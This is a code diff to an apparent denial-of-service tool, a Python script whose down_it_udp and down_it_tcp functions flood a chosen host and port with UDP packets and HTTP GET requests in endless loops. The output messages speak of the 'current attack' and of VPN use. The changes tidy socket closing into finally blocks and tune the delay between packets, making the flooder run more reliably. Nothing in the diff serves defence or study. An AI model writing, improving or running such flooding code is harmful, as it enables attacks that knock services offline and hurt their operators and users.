@@ -64,11 +64,6 @@ def down_it_udp():
         p = int(port) if port else get_random_port()
         try:
             s.sendto(packet, (host, p))
-            time.sleep(.01)
-            try:
-                s.close()
-            except:
-                print("\033[91m Socket close failed.\033[0m")
         except socket.gaierror:
             print("\033[91m Can't get server IP. Packet sending failed. Check your VPN.\033[0m")
         except BaseException as e:
@@ -77,7 +72,12 @@ def down_it_udp():
             print("\033[91m Packet sending failed. Check your VPN.\033[0m")
         else:
             print('\033[92m Packet was sent \033[0;0m')
-            time.sleep(.01)
+        finally:
+            try:
+                s.close()
+            except:
+                print("\033[91m Socket close failed.\033[0m")
+        time.sleep(.03)
 
         if port:
             i += 1
@@ -128,19 +128,18 @@ def down_it_http():
 
 def down_it_tcp():
     while True:
+        packet = str(
+            "GET " + resource + " HTTP/1.1"
+            + "\nHost: " + host
+            + "\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
         try:
-            packet = str(
-                "GET " + resource + " HTTP/1.1"
-                + "\nHost: " + host
-                + "\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 print('\033[92m TCP Packet was sent \033[0;0m')
             else:
                 print("\033[91m shut<->down \033[0m")
-            time.sleep(.01)
             try:
                 s.close()
             except:
@@ -150,7 +149,13 @@ def down_it_tcp():
                 print("\033[91m Error: " + str(e) + ".\033[0m")
             print("\033[91m No connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
-            time.sleep(.01)
+        finally:
+            try:
+                s.close()
+            except:
+                print("\033[91m Socket close failed.\033[0m")
+
+        time.sleep(.01)
 
 
 def usage():
